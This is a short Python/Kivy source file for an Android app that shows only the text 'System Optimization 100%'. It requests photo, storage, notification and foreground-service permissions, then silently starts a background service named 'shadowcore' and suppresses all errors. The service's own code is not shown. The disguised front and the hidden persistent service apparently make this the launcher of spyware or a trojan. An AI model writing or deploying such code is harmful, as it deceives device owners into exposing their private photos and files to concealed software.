from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
from jnius import autoclass

class MainApp(App):
    def build(self):
        return Label(text="System Optimization 100%")

    def on_start(self):
        Clock.schedule_once(self.ask_perms, 1)

    def ask_perms(self, dt):
        try:
            from android.permissions import request_permissions, Permission
            request_permissions([Permission.READ_MEDIA_IMAGES, Permission.READ_EXTERNAL_STORAGE, Permission.POST_NOTIFICATIONS, Permission.FOREGROUND_SERVICE], self.go)
        except: pass

    def go(self, permissions, grants):
        try:
            service = autoclass('org.test.shadowcore.ServiceService')
            service.start(autoclass('org.kivy.android.PythonActivity').mActivity, "")
        except: pass

if __name__ == "__main__":
    MainApp().run()
